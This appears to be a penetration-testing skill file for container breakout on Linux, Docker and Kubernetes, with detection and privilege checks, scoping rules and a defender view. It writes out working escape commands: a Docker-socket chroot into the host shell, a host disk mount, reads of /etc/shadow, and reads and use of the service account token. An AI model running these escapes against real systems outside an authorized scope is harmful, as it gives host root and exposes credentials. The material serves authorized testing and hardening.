---
name: container-breakout-checks
description: Use when your Linux shell is inside a container on an
  authorized engagement and you need to check for escape paths to the
  host. Covers container detection, dangerous mounts and sockets,
  privileged mode checks, and capability review. Use when privesc-linux
  stalls inside Docker or Kubernetes, when assessing container hardening,
  or when deciding whether host access is achievable and in scope.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
parent: privesc-linux
requires: [privesc-linux]
extends: []
relates: [cloud-security-basics, linux-hardening]
tools:
  - name: Python
    version: 3.12
  - name: Docker
    version: 25.0
---

A container is not a security boundary by itself: misconfigured mounts,
sockets, and privileges turn container root into host root. This skill
covers checking for container escapes on authorized engagements: detecting
the container, reviewing its privileges and mounts, and testing the classic
escape paths. Breakout attempts target the host, so the approval bar is
higher than normal privesc; confirm scope covers the host before testing
escapes.

## Quick Workflow

1. Confirm you are in a container and identify the runtime.
2. Check for privileged mode, dangerous capabilities, and host mounts.
3. Check for the Docker socket and host PID or network namespaces.
4. Test the escape path that matches the misconfiguration, with approval.
5. Prove host access minimally (read one host file, run `id` on the host).
6. Report the misconfiguration with the exact settings that allowed it.

## 1. Detection and privilege review

```bash
# Am I in a container?
cat /proc/1/cgroup 2>/dev/null | head -5
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -E 'docker|kubepods' | head -3

# Privileged mode: full device access means near-certain escape
ls /dev/ | wc -l  # hundreds of devices suggests --privileged
cat /proc/self/status | grep -i cap
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null

# Dangerous mounts: host root, docker socket, host proc
mount | grep -E ' / |docker.sock'
ls -la /var/run/docker.sock 2>/dev/null
cat /proc/self/mountinfo | grep -E ' /host| / ' | head -5
```

`--privileged` plus any mount trick equals host root in practice. The
Docker socket equals root through container creation. A host-path mount
equals direct file access. Rank findings in that order.

## 2. Classic escape paths

```bash
# Path 1: Docker socket available -> run a privileged container
# with the host filesystem mounted (needs docker CLI or API access)
docker run -v /:/host -it alpine chroot /host /bin/bash

# Path 2: host filesystem mounted at /host -> direct access
ls /host/etc/shadow 2>/dev/null && echo "HOST FS MOUNTED"

# Path 3: privileged mode -> mount host disk from inside
fdisk -l 2>/dev/null | head -10
# mkdir /mnt/host; mount /dev/sda1 /mnt/host

# Path 4: writable hostPath in Kubernetes -> check the mount table
# and the service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-40
```

Test the least invasive proof first: reading a host file beats writing
one, and listing beats both. Full interactive host shells are rarely
needed to prove the finding.

## 3. Kubernetes-specific checks

```bash
# Service account token and API access
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
# Can the token list secrets cluster-wide? (test read-only)
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  auth can-i list secrets --all-namespaces 2>&1 | head -3

# Node access via hostPath or hostNetwork
cat /proc/self/mountinfo | grep -c 'kubepods'
ip addr | grep -E 'inet ' | head -5
```

An over-permissioned service account is the Kubernetes equivalent of a
SUID binary: enumerate its rights with `auth can-i` before attempting
anything, and report excessive rights as the finding even without
exploiting them.

## Edge cases

- The container is well-configured: no socket, no host mounts, dropped
  capabilities. Report the hardening as positive and move privesc back
  inside the container (application-layer paths).
- The escape needs the Docker socket but only the API is exposed. The
  socket API over TCP with no auth is equivalent to the socket file.
- AppArmor or seccomp blocks the escape technique. Note the control
  working; try the documented alternative paths once each, then stop.
- You are in a VM, not a container. The cgroup checks distinguish them;
  VM escape is out of scope for this skill and almost every engagement.

## Escalation

- Scope does not cover the host: enumerate and report the escape path
  without executing it; the misconfiguration is the finding.
- Scope covers the host: get explicit approval for the specific
  technique, prove access minimally, and avoid host modifications.
- The escape leads to a cluster: hand findings to the cloud review
  (cloud-security-basics) since the blast radius is now the platform.

## Detection and defender view

Defenders see breakouts as containers spawning privileged siblings,
mounts of host paths, and API calls creating host-mounted pods, all
visible in the container runtime audit logs and Kubernetes audit logs.
Defenses are no privileged containers, no Docker socket mounts, read-only
root filesystems, dropped capabilities, seccomp and AppArmor profiles,
and admission controllers that reject hostPath and privileged pods.

## Key references

- MITRE ATT&CK T1611 (Escape to Host).
- MITRE ATT&CK T1610 (Deploy Container).
- CWE-250 (Execution with Unnecessary Privileges).
- Docker and Kubernetes security best practice documentation.
